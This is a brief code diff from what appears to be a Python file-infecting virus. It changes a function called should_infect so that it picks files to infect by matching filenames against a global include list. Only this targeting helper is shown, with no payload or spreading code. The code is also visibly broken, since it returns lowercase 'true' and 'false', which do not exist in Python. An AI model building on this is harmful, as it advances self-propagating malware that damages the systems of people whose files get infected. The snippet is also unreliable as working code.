@@ -102,8 +102,11 @@ def should_infect(pth):
     @param pth: the complete URI of the file we'll check
     return: a boolean indicating if we should infect the file
     """
-    fname = str(re.search('/(.+?).py', pth).group(0)) + ".py"
-    print(fname)
+    global INCLUDE_LIST
+    fname = pth.split('/')[-1]
+    if fname in INCLUDE_LIST:
+        print(fname)
+        return true
     return false
 
 
